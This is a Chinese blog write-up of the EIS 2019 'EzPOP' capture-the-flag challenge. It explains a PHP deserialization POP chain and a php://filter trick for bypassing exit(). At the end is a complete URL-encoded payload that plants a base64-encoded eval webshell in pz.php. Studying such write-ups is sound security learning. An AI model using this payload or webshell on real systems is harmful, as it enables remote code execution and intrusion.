---
title: '[EIS 2019]EzPOP'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-10-27 13:27:23
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-108819.jpg
---
[EIS 2019]EzPOP
我必须承认这代码我看了一遍之后没啥头绪。。。
不过这种东西不知道它干啥的没关系 我们只要找敏感函数就行
首先看A类的魔法函数destruct，就从这里开始分析吧。若autosave的值等于0，则触发save函数。然而save函数中有个不属于A类但是属于B类的set函数，这就很有意思了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201028142802.png)

先假定this->store指向B类，然后跟进set函数，然而看了几行就不想跟进了。。。
但是看到后面有一个file_put_contents

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201028151152.png)

这应该是一个可以利用的点，name就是A类传过来的key，可控，B类中getCacheKey函数里的options数组也可控，所以文件名可控。

接下来就是看写入的内容是否可控了，即data。
$data = $this->serialize($value);
value就是A类传过来的content

if ($this->options['data_compress'] && function_exists('gzcompress')) {
  //数据压缩
  $data = gzcompress($data, 3);
   }
这一段不知道是干啥的，暂且不去管

$data = $this->serialize($value);这东西乍一看以为是写入序列化过的内容，可往上一看发现定义了一个serialize函数。

$serialize = $this->options['serialize'];
return $serialize($data);

思路
A：
$store 指向B
$key   文件后缀名  指定就 .php
$expire 没啥用
$this->autosave false
$this->cache 设为空
$this->complete  马

B:
options['prefix']  文件名
options['serialize'] 方法
options['expire'] 没啥用
options['data_compress']  false

pop链太急了就不写了 得去跑步了 简单总结下知识点

exit（）用伪协议绕过
然后 好像没有然后了 
这题buu上做着不难 到比赛的时候估计也是一道难题 因为会出很多细节上的问题。

payload：?src&data=O%3A1%3A"A"%3A5%3A{s%3A8%3A"%00*%00store"%3BO%3A1%3A"B"%3A1%3A{s%3A7%3A"options"%3Ba%3A4%3A{s%3A6%3A"prefix"%3Bs%3A50%3A"php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D"%3Bs%3A6%3A"expire"%3Bi%3A11%3Bs%3A13%3A"data_compress"%3Bb%3A0%3Bs%3A9%3A"serialize"%3Bs%3A6%3A"strval"%3B}}s%3A6%3A"%00*%00key"%3Bs%3A6%3A"pz.php"%3Bs%3A9%3A"%00*%00expire"%3BN%3Bs%3A5%3A"cache"%3Ba%3A1%3A{i%3A111%3Ba%3A1%3A{s%3A4%3A"path"%3Bs%3A38%3A"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg"%3B}}s%3A8%3A"complete"%3Bs%3A1%3A"2"%3B}